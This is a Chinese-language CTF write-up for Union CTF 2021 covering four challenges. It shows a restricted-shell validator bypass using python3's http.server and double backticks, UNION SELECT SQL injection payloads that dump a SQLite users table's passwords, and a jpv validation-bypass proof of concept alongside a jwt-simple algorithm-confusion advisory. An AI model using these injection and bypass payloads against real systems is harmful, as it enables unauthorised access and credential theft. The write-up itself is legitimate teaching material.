<!DOCTYPE html>
<html lang=zh-TW>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="MiscğŸ‘‘ Welcome ğŸ‘‘Rules è£¡é¢å¯ä»¥æ‰¾åˆ° flagã€‚ 1union&amp;#123;r0p_s4v3_the_que3n&amp;#125;  bashlex We made a new restricted shell with fancy AST validation, and we donâ€™t allow cat! The flag is in &#x2F;home&#x2F;bashlex&#x2F;flag.tx">
<meta property="og:type" content="article">
<meta property="og:title" content="Union CTF 2021">
<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html">
<meta property="og:site_name" content="Hexagon">
<meta property="og:description" content="MiscğŸ‘‘ Welcome ğŸ‘‘Rules è£¡é¢å¯ä»¥æ‰¾åˆ° flagã€‚ 1union&amp;#123;r0p_s4v3_the_que3n&amp;#125;  bashlex We made a new restricted shell with fancy AST validation, and we donâ€™t allow cat! The flag is in &#x2F;home&#x2F;bashlex&#x2F;flag.tx">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/temporaryButter/1614010796900.c69eb4f63ecc9ca11ca3da90eef2fef1632493c7.png">
<meta property="article:published_time" content="2021-02-23T17:25:00.000Z">
<meta property="article:modified_time" content="2021-04-28T08:29:25.703Z">
<meta property="article:author" content="LemonPrefect">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/temporaryButter/1614010796900.c69eb4f63ecc9ca11ca3da90eef2fef1632493c7.png">
    
    
      
        
          
            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
          
        
      
      
        
          
            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
          
        
      
      
        
          
            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
          
        
      
    
    <!-- title -->
    <title>Union CTF 2021</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/zh-TW/">é¦–é </a></li>
         
          <li><a href="/zh-TW/archives/">æ–‡ç« </a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">å·¥å…·</a></li>
         
          <li><a href="/about/">é—œæ–¼</a></li>
         
          <li><a href="/search/">æœå°‹</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        <!-- 
        <li><a class="icon" aria-label="ä¸Šä¸€ç¯‡ " href="/zh-CN/posts/17a1c7f0.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="ä¸‹ä¸€ç¯‡ " href="/zh-CN/posts/447b0fce.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        --!>

        
          
          
          
            <li><a class="icon" aria-label="ä¸­æ–‡ç®€ä½“ï¼ˆå¤§é™†æ ‡å‡†ï¼‰ " href="/zh-CN/posts/17a1c7f0.html">ç®€</a></li>
          
            <li><a class="icon" aria-label="æ­£ä½“ä¸­æ–‡ï¼ˆå°ç£æ¨™æº–ï¼‰ " href="#">æ­£</a></li>
          
        

        <li><a class="icon" aria-label="å›åˆ°é é¦– " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
        <li><a class="icon" aria-label="åˆ†äº« " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">ä¸Šä¸€ç¯‡</span>
      <span id="i-next" class="info" style="display:none;">ä¸‹ä¸€ç¯‡</span>
      <span id="i-top" class="info" style="display:none;">å›åˆ°é é¦–</span>
      <span id="i-share" class="info" style="display:none;">åˆ†äº«</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&text=Union CTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&is_video=false&description=Union CTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Union CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&name=Union CTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&t=Union CTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%91-Welcome-%F0%9F%91%91"><span class="toc-number">1.1.</span> <span class="toc-text">ğŸ‘‘ Welcome ğŸ‘‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bashlex"><span class="toc-number">1.2.</span> <span class="toc-text">bashlex</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meet-the-Union-Committee"><span class="toc-number">2.1.</span> <span class="toc-text">Meet the Union Committee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cr0wnAir"><span class="toc-number">2.2.</span> <span class="toc-text">Cr0wnAir</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Union CTF 2021
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">LemonPrefect</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-02-23T17:25:00.000Z" itemprop="datePublished">2021-02-24</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ğŸ‘‘-Welcome-ğŸ‘‘"><a href="#ğŸ‘‘-Welcome-ğŸ‘‘" class="headerlink" title="ğŸ‘‘ Welcome ğŸ‘‘"></a>ğŸ‘‘ Welcome ğŸ‘‘</h3><p>Rules è£¡é¢å¯ä»¥æ‰¾åˆ° flagã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;r0p_s4v3_the_que3n&#125;</span><br></pre></td></tr></table></figure>

<h3 id="bashlex"><a href="#bashlex" class="headerlink" title="bashlex"></a>bashlex</h3><blockquote>
<p>We made a new restricted shell with fancy AST validation, and we donâ€™t allow <code>cat</code>!</p>
<p>The flag is in <code>/home/bashlex/flag.txt</code>.</p>
</blockquote>
<p>çµ¦å‡ºçš„ç¨‹å¼ç¢¼å¦‚ä¸‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bashlex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ALLOWED_COMMANDS = [<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">ast</span>):</span></span><br><span class="line">    queue = [ast]</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        node = queue.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> node.kind == <span class="string">&#x27;command&#x27;</span>:</span><br><span class="line">            first_child = node.parts[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> first_child.kind == <span class="string">&#x27;word&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> first_child.parts:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Forbidden top level command&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> first_child.word.startswith((<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Path components are forbidden&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> first_child.word.isalpha() <span class="keyword">and</span> \</span><br><span class="line">                        first_child.word <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_COMMANDS:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Forbidden command&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> node.kind == <span class="string">&#x27;commandsubstitution&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Command substitution is forbidden&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> node.kind == <span class="string">&#x27;word&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;[&#x27;</span>] <span class="keyword">if</span> c <span class="keyword">in</span> node.word]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Wildcards are forbidden&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> node.word:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag is forbidden&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Add node children</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;parts&#x27;</span>):</span><br><span class="line">            queue += node.parts</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;list&#x27;</span>):</span><br><span class="line">            <span class="comment"># CompoundNode</span></span><br><span class="line">            queue += node.<span class="built_in">list</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    inp = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parts = bashlex.parse(inp)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> parts:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> validate(p):</span><br><span class="line">                valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;INVALID&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    subprocess.call([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, inp])</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹ä¸€ä¸‹ bashlex çš„æŠ½å–é‚è¼¯ï¼Œä»¥ ls é€™æ¢æŒ‡ä»¤ç‚ºä¾‹ã€‚</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CommandNode(parts&#x3D;[WordNode(parts&#x3D;[] pos&#x3D;(0, 2) word&#x3D;&#39;ls&#39;)] pos&#x3D;(0, 2))]</span><br></pre></td></tr></table></figure>

<p>CommandNode è£¡åŒ…æ‹¬ WordNodeï¼Œæ¯å€‹ Node åŒ…æ‹¬ pos å’Œ partsã€‚æ‰€ä»¥æ­¤æ™‚çš„è¦å‰‡å¤§æ¦‚æ˜¯æŒ‡ä»¤ä¸­ä¸èƒ½å«æœ‰è®Šæ•¸ã€ä¸èƒ½ä»¥è·¯å¾‘é–‹é ­ã€å¦‚æœæ˜¯ç´”å­—æ¯çš„æŒ‡ä»¤å‰‡ä¸å…è¨±ç™½åå–®ä»¥å¤–çš„æŒ‡ä»¤ã€‚åŒæ™‚ä¸å¯ä»¥ä½¿ç”¨ bash çš„æŒ‡ä»¤æ›¿ä»£ï¼ˆä½†æ˜¯é€™é»æœ‰é»è¿·æƒ‘ï¼‰ã€‚æ‰€ä»¥åªéœ€è¦æ‰¾åˆ°ä¸€å€‹éç´”å­—æ¯çµ„æˆçš„æŒ‡ä»¤å³å¯ã€‚é€™è£¡å› ç‚ºæ˜¯ python çš„ç’°å¢ƒã€‚æ–¼æ˜¯æœ‰ python3 çš„æŒ‡ä»¤å¯ä»¥è¢«æˆåŠŸåŸ·è¡Œã€‚ç”±æ–¼æ²’æœ‰å›é¡¯ï¼Œæ‰€ä»¥å˜—è©¦é–‹å€‹ http æœå‹™ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 2333</span><br></pre></td></tr></table></figure>

<p>æ­¤æ™‚è¨ªå•åˆ°<a target="_blank" rel="noopener" href="http://34.90.44.21:2333/home/bashlex/flag.txt">é€™è£¡</a>å¯å¾— flagã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;chomsky_go_lllllllll1&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°å¤§ä½¬çš„ä¸€ç¨®è§£æ³•æ˜¯ç”¨çš„æŒ‡ä»¤æ›¿ä»£ï¼Œä½†æ˜¯è¦ä½¿ç”¨é›™æ•¸åå¼•è™Ÿå»æ›¿ä»£ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;`ls`</span><br><span class="line">[CommandNode(parts=[WordNode(parts=[CommandsubstitutionNode(<span class="built_in">command</span>=CommandNode(parts=[WordNode(parts=[] pos=(1, 3) word=<span class="string">&#x27;ls&#x27;</span>)] pos=(1, 3)) pos=(0, 4))] pos=(0, 4) word=<span class="string">&#x27;`ls`&#x27;</span>)] pos=(0, 4))] <span class="comment">#æ­¤æ™‚å› ç‚ºè¢« bashlex æ­£ç¢ºè§£æç„¡æ³•é€éæª¢æ¸¬</span></span><br><span class="line">&gt;``ls``</span><br><span class="line">[CommandNode(parts=[WordNode(parts=[] pos=(0, 6) word=<span class="string">&#x27;``ls``&#x27;</span>)] pos=(0, 6))] <span class="comment">#æ­¤æ™‚è§£æå‡ºä¾†åªæœ‰ä¸€å€‹ WordNodeï¼Œå¯ä»¥æ­£å¸¸åŸ·è¡Œ</span></span><br></pre></td></tr></table></figure>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Meet-the-Union-Committee"><a href="#Meet-the-Union-Committee" class="headerlink" title="Meet the Union Committee"></a>Meet the Union Committee</h3><blockquote>
<p>A committee was formed last year to decide the highly-sensitive contents of our challenges. All we could find is their profiles on this website. They are super paranoid that their profile site is hackable and decided to implement insane rate limits. Really we need to get access to the adminâ€™s password. If only that was possible.</p>
</blockquote>
<p>éš¨ä¾¿é»é€²ä¸€å€‹äººçš„ä¸»é å¯ä»¥ç™¼ç¾ URL å¤šäº†å€‹ GET å¼•æ•¸ idã€‚å˜—è©¦ä¸‹ç™¼ç¾å­˜åœ¨ SQL æ³¨å…¥ï¼Œä¸”å¯ä»¥ç™¼ç¾å¦‚ä¸‹å ±éŒ¯ã€‚</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;unionflaggenerator.py&quot;, line 49, in do_GET</span><br><span class="line">    cursor.execute(&quot;SELECT id, name, email FROM users WHERE id&#x3D;&quot; + params[&quot;id&quot;])</span><br><span class="line">sqlite3.OperationalError: near &quot;â€˜&quot;: syntax error</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç™¼ç¾æ•¸æ“šåº«æ¡ç”¨çš„æ˜¯ sqlite3ã€‚å˜—è©¦æ§‹é€ èªå¥è®€å– sqlite_master è£¡çš„ sql ä»¥å¾—å‡ºè³‡æ–™åº«ä¸­è¡¨çš„çµæ§‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%20union%20select%201,group_concat(sql),3%20from%20sqlite_master--+</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›é¡¯ã€‚</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, email TEXT, password TEXT),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)</span><br></pre></td></tr></table></figure>

<p>æ–¼æ˜¯æ ¹æ“šé¡Œç›®æè¿°ï¼Œå˜—è©¦è®€å–è¡¨ä¸­çš„å¯†ç¢¼æ¬„ä½ï¼Œå³ users è¡¨ä¸‹çš„ passwordã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%20union%20select%201,group_concat(password),3%20from%20users--+</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å¦‚ä¸‹å›é¡¯ã€‚</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;uni0n_4ll_s3l3ct_n0t_4_n00b&#125;,RightBehindU,diamond69_hands420,winter2020,peter1,password,ilikesex</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;uni0n_4ll_s3l3ct_n0t_4_n00b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Cr0wnAir"><a href="#Cr0wnAir" class="headerlink" title="Cr0wnAir"></a>Cr0wnAir</h3><blockquote>
<p>Cr0wn is getting into the airline business to make some sweet profits when everyone is able to travel again. Can you upgrade your trip?</p>
</blockquote>
<blockquote>
<p>é¡Œç›®é™„ä»¶ï¼š <a target="_blank" rel="noopener" href="https://1drv.ms/u/s!Aqe9Z34waQq1kx1op6yCo_i43ijL?e=VmOaeh">https://1drv.ms/u/s!Aqe9Z34waQq1kx1op6yCo_i43ijL?e=VmOaeh</a></p>
</blockquote>
<p>é™„ä»¶ä¸‹è¼‰ä¸‹ä¾†ï¼Œå¯ä»¥ç™¼ç¾æ˜¯ nodejs çš„å°ˆæ¡ˆã€‚é¦–å…ˆçœ‹ä¸€ä¸‹å°ˆæ¡ˆçš„ package.jsonã€‚</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;cr0wnAir&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;app.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;node app.js&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;hyperreality&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;4.17.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;jpv&quot;</span>: <span class="string">&quot;2.0.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;jwt-simple&quot;</span>: <span class="string">&quot;0.5.2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ <code>npm audit</code> å¯ä»¥ç™¼ç¾å ±å‡ºçš„ä¸€å€‹ jwt-simple çš„é«˜å±æ¼æ´ï¼Œæ ¹æ“š<a target="_blank" rel="noopener" href="https://www.npmjs.com/advisories/831">æè¿°</a>ï¼Œå®ƒå…è¨±æˆ‘å€‘ä½¿ç”¨ HS256 æ¼”ç®—æ³•çš„ token å»ä»£æ›¿ RS256 æ¼”ç®—æ³•çš„ token æˆåŠŸè§£ç¢¼ã€‚åŒæ™‚å¯ä»¥ç™¼ç¾ jpv ä½¿ç”¨çš„æ˜¯è »è€çš„åŒ…ã€‚åœ¨ Synk å¯ä»¥æŸ¥åˆ°é€™å€‹ç‰ˆæœ¬çš„<a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-JPV-536466">ä¸€å€‹é«˜å±æ¼æ´</a>ã€‚å®šä½åˆ° <a target="_blank" rel="noopener" href="https://github.com/manvel-khnkoyan/jpv/issues/6">Issue</a> å¯ä»¥ç™¼ç¾ç›¸é—œçš„ PoC ä½œç”¨æ–¼ <code>jpv.validate</code> æ–¹æ³•ä¸Šã€‚å¯«ä¸€æ®µç¨‹å¼ç¢¼å¾©ç¾é€™å€‹æ¼æ´ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jpv = <span class="built_in">require</span>(<span class="string">&quot;jpv&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> inputA = &#123;</span><br><span class="line">	a: &#123;<span class="string">&quot;nothing&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Lemon&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> inputB = &#123;</span><br><span class="line">	a: &#123;<span class="string">&quot;nothing&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> pattern = &#123;</span><br><span class="line">	a: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(jpv.validate(inputA, pattern))</span><br><span class="line"><span class="built_in">console</span>.log(jpv.validate(inputB, pattern))</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„çµæœå¦‚ä¸‹åœ–ã€‚</p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/temporaryButter/1614010796900.c69eb4f63ecc9ca11ca3da90eef2fef1632493c7.png"></p>
